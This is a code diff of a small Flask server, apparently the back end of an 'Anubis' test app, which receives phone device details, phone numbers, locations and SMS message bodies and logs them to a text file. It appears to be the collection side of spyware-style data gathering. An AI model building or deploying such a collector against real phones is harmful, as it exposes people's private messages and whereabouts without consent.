@@ -7,17 +7,23 @@ app = Flask(__name__)
 @app.route("/device", methods=["POST"])
 def device():
     device_info = request.get_json()
+    #location_info = request.get_json()
     Manufacturer = device_info['manufacturer']
     Model = device_info['model']
     verison = device_info['androidVersion']
-    phoneno = device_info['phoneno']
-    if phoneno ==None:
-     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison)
-    else:
-     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison +  " and phone number is " + phoneno)
-   
-    return "deviceinfo working", 200
     
+    
+    try:
+     phoneno = device_info['phoneno']
+     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison +  " and phone number is " + phoneno)
+    except:
+     location = device_info['location']
+     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison)
+     print("Location is " + location)
+
+
+    return "deviceinfo working", 200
+
 @app.route("/sms", methods=["POST"])
 def sms():
     sms_content = request.get_json()
@@ -26,7 +32,7 @@ def sms():
 
     # append to the existing txt from the Anubis Test App folder according to your own directory
     # for example
-    with open(os.path.join('C:\\Users\\Jevan\\OneDrive\\Documents\\GitHub\\AnubisTestApp\\', 'smsdata.txt'), 'a') as f:
+    with open(os.path.join('C:\\Users\\kian_\\Downloads\\Git\\AnubisTestApp_geo\\', 'smsdata.txt'), 'a') as f:
         f.write('\n' + body)
 
     print("SMS Retrieved from Phone Number(" + address + ") : " + body)
